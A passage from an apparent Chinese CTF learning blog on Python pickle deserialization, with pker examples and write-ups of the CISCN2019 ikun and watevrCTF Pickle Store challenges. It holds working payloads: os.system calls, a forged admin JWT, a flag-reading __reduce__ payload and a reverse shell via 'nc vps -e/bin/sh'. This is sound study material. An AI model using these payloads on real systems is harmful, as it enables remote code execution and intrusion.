<li>通过<code>b'i'</code>调用：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>
<ul>
<li>通过<code>b'c'</code>与<code>b'o'</code>调用：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">OBJ(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>
<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">INST(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])<br>OBJ(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)[, par0,par1...])<br></code></pre></td></tr></table></figure>
<h3 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h3>
<ul>
<li>实例化对象是一种特殊的函数执行</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-comment"># 或者</span><br><br>animal = OBJ(GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure>
<ul>
<li>其中，python原文件中包含：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):<br>        self.name = name<br>        self.category = category<br></code></pre></td></tr></table></figure>
<ul>
<li>也可以先实例化再赋值：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure>
<p><strong>手动辅助</strong></p>
<ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h2 id="8-4-CTF实战"><a href="#8-4-CTF实战" class="headerlink" title="8-4-CTF实战"></a>8.4 CTF实战</h2>
<ul>
<li>在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。</li>
</ul>
<h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2-ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3>
<p>首先是一个脚本爆破</p>
<p class='item-img' data-src='image-20231117205221800.png'><img src="image-20231117205221800.png" alt="image-20231117205221800"></p>
<p>首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>):<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    url = <span class="hljs-string">&#x27;http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找到lv6----&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231117205950545.png'><img src="image-20231117205950545.png" alt="image-20231117205950545"></p>
<p>如上图在181页，我们访问看看，我们在结算的时候抓包看看</p>
<p class='item-img' data-src='image-20231117205832323.png'><img src="image-20231117205832323.png" alt="image-20231117205832323"></p>
<p>如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber</p>
<p class='item-img' data-src='image-20231117205907430.png'><img src="image-20231117205907430.png" alt="image-20231117205907430"></p>
<p>看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具：</p>
<p>github链接<code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
<p class='item-img' data-src='image-20231117222052443.png'><img src="image-20231117222052443.png" alt="image-20231117222052443"></p>
<p>用法这里就不赘述了，如上图可以看到secret是1Kun</p>
<p class='item-img' data-src='image-20231117222213855.png'><img src="image-20231117222213855.png" alt="image-20231117222213855"></p>
<p>如上图进行伪造之后发送到bp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA<br></code></pre></td></tr></table></figure>
<p>发送之后是如下页面：</p>
<p class='item-img' data-src='image-20231118092031351.png'><img src="image-20231118092031351.png" alt="image-20231118092031351"></p>
<p>成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看</p>
<p class='item-img' data-src='image-20231118092024158.png'><img src="image-20231118092024158.png" alt="image-20231118092024158"></p>
<p>如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br> <br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
<p>分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">pop</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;, &#x27;r&#x27;).read()&quot;</span>, ))<br><br>poc = pop()<br>s = pickle.dumps(poc)<br><span class="hljs-built_in">print</span>(urllib.qoute(s))<span class="hljs-comment">#注意上述题目中的p参数是经过urllib.unquote函数处理的</span><br></code></pre></td></tr></table></figure>
<p>之后在python2环境下运行，向become传参即可</p>
<p class='item-img' data-src='image-20231118094613051.png'><img src="image-20231118094613051.png" alt="image-20231118094613051"></p>
<p>这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag</p>
<p class='item-img' data-src='image-20231118094606060.png'><img src="image-20231118094606060.png" alt="image-20231118094606060"></p>
<h4 id="Bandit-自动化工具"><a href="#Bandit-自动化工具" class="headerlink" title="Bandit-自动化工具"></a>Bandit-自动化工具</h4>
<p>Bandit 是一款旨在查找 Python 代码中常见安全问题的工具。为此，Bandit 处理每个文件，从中构建 AST，并针对 AST 节点运行适当的插件。一旦 Bandit 完成扫描所有文件，它就会生成一份报告。</p>
<p>我们可以利用上述工具来进行自动的代码审计，看看上述工具是否可以分析出来源码中含有pickle漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bandit -r 需要分析的文件路径<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231214120623360.png'><img src="image-20231214120623360.png" alt="image-20231214120623360"></p>
<p>如上图，的确跟我们手工分析的注入点一致</p>
<h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="watevrCTF-2019-Pickle-Store"></a>[watevrCTF-2019]Pickle Store</h3>
<p class='item-img' data-src='image-20231118112325674.png'><img src="image-20231118112325674.png" alt="image-20231118112325674"></p>
<p>刚开始提示我们要买pickle这个东西，但我用bp抓包只是发现了cookie以及id在变化，看着像base64，但解密却是一堆乱码，于是看了wp发现这是先pickle序列化后在base解密的，那就好办了，写一个简单脚本即可</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>result = <span class="hljs-string">&#x27;gAN9cQAoWAUAAABtb25leXEBS2RYBwAAAGhpc3RvcnlxAl1xAyhYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQVYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQZYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQdlWBAAAABhbnRpX3RhbXBlcl9obWFjcQhYIAAAADU3YzExYTRmMTE4YmM2Yzc5YmFmNjI2NWE5MWI5NWQwcQl1Lg==&#x27;</span><br>result = base64.b64decode(result)<br>result = pickle.loads(result)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
<p>解密出来为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;<span class="hljs-string">&#x27;money&#x27;</span>: <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;history&#x27;</span>: [<span class="hljs-string">&#x27;Yummy smörgåsgurka&#x27;</span>, <span class="hljs-string">&#x27;Yummy smörgåsgurka&#x27;</span>, <span class="hljs-string">&#x27;Yummy smörgåsgurka&#x27;</span>, <span class="hljs-string">&#x27;Yummy smörgåsgurka&#x27;</span>], <span class="hljs-string">&#x27;anti_tamper_hmac&#x27;</span>: <span class="hljs-string">&#x27;57c11a4f118bc6c79baf6265a91b95d0&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>这里看到个hmac搜了搜是个算法什么的，也没具体了解就看wp了，这里他们说这种算法也没法利用了，可以直接将一段恶意的pickle代码base64编码后放到cookie进行getshell。因为这里是buu环境，内部靶机不出网，所以也懒得去开小号啥的，就看个思路，payload如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vps -e/bin/sh&#x27;)&quot;</span>,))<br><br>pop = Demo()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(pop)))<br><br><span class="hljs-comment">#输出</span><br><span class="hljs-string">b&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIHZwcyAtZS9iaW4vc2gnKZSFlFKULg==&#x27;</span><br></code></pre></td></tr></table></figure>
<p>之后反弹成功进行getshell即可</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12698897.html">https://www.cnblogs.com/h3zh1/p/12698897.html</a></p>
<p>其他方法可也参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7320">https://xz.aliyun.com/t/7320</a></p>
<p>总的来说，学phar反序列化任重而道远，虽然总结了这么多，但消化的感觉挺少，以后会多找点这种题目的，继续更新这篇文章（毕竟质量太辣鸡）</p>
<h1>0x09 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436#toc-12">pickle反序列化初探</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11082#toc-2">Python反序列化漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结</a> – pickle pass可参考</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7320">利用python反序列化覆盖秘钥——watevrCTF-2019:Pickle Store的第二种解法</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/19/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/">← 下一篇 汇编基础指令</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">Phar反序列化 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 可序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-object-reduce-%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 object.__reduce__() 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reduce"><span class="toc-number">3.4.1.</span> <span class="toc-text">__reduce__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setstate"><span class="toc-number">3.4.2.</span> <span class="toc-text">__setstate__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getstate"><span class="toc-number">3.4.3.</span> <span class="toc-text">__getstate__()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-1-%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.1.</span> <span class="toc-text">3.5.1 序列化操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.2.</span> <span class="toc-text">3.5.2 反序列化操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 Pickle过程详细解读</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 执行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-opcode%E7%AE%80%E4%BB%8B"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 opcode简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 指令集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-Pickletools"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 Pickletools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E4%BE%8B%E5%AD%90-%E6%96%87%E5%AD%97%E8%AF%B4%E6%98%8E"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 例子-文字说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86%EF%BC%9Apickle-EXP%E7%9A%84%E7%AE%80%E5%8D%95demo"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 初步认识：pickle EXP的简单demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99opcode"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 如何手写opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-1-%E5%B8%B8%E7%94%A8opcode%E8%A7%A3%E6%9E%90"><span class="toc-number">5.4.1.</span> <span class="toc-text">5.4.1 常用opcode解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-2-%E6%8B%BC%E6%8E%A5opcode"><span class="toc-number">5.4.2.</span> <span class="toc-text">5.4.2 拼接opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">5.4.2.1.</span> <span class="toc-text">全局变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">5.4.2.2.</span> <span class="toc-text">函数执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">5.4.2.3.</span> <span class="toc-text">实例化对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pker%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">5.4.2.4.</span> <span class="toc-text">pker的使用（推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.4.2.5.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-3-CTF%E5%AE%9E%E6%88%98"><span class="toc-number">5.4.3.</span> <span class="toc-text">5.4.3 CTF实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E4%B9%8B%E5%89%8D%EF%BC%9A%E4%BA%86%E8%A7%A3pickle-Unpickler-find-class"><span class="toc-number">5.4.3.1.</span> <span class="toc-text">做题之前：了解pickle.Unpickler.find_class()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87builtins"><span class="toc-number">5.4.3.1.1.</span> <span class="toc-text">绕过builtins</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Breaking-picklecode"><span class="toc-number">5.4.3.2.</span> <span class="toc-text">Code-Breaking:picklecode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-webtmp"><span class="toc-number">5.4.3.3.</span> <span class="toc-text">高校战疫网络安全分享赛:webtmp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF-case1"><span class="toc-number">5.4.3.4.</span> <span class="toc-text">CTF-case1</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 Marshal 反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 Pass总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-%E7%BB%95%E8%BF%87builtins"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 绕过builtins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toc-number">7.1.1.</span> <span class="toc-text">思路一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toc-number">7.1.2.</span> <span class="toc-text">思路二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E7%BB%95%E8%BF%87R%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 绕过R指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.1.</span> <span class="toc-text">i指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.2.</span> <span class="toc-text">o指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b%E6%8C%87%E4%BB%A4"><span class="toc-number">7.2.3.</span> <span class="toc-text">b指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">7.3.</span> <span class="toc-text">7.3 绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8V%E6%8C%87%E4%BB%A4%E8%BF%9B%E8%A1%8CUnicode%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.1.</span> <span class="toc-text">利用V指令进行Unicode绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.2.</span> <span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">7.3.3.</span> <span class="toc-text">利用内置函数获取关键字</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 pker使用说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-%E7%AE%80%E4%BB%8B"><span class="toc-number">8.1.</span> <span class="toc-text">8.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-pker%E8%83%BD%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="toc-number">8.2.</span> <span class="toc-text">8.2 pker能做的事</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">8.3.</span> <span class="toc-text">8.3 使用方法与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pker%EF%BC%9A%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">8.3.1.</span> <span class="toc-text">pker：全局变量覆盖</span></a></li><li class="toc-item 